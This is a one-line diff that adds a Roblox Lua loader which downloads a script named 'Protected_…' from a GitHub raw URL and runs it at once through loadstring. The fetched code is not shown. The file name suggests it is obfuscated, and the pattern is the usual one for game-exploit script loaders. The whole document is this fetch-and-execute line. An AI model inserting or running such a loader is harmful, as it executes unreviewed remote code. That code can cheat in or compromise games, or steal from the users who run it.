@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pudge24/Pudge24Scripts.github.io/refs/heads/main/Protected_7243251867428769.txt"))()
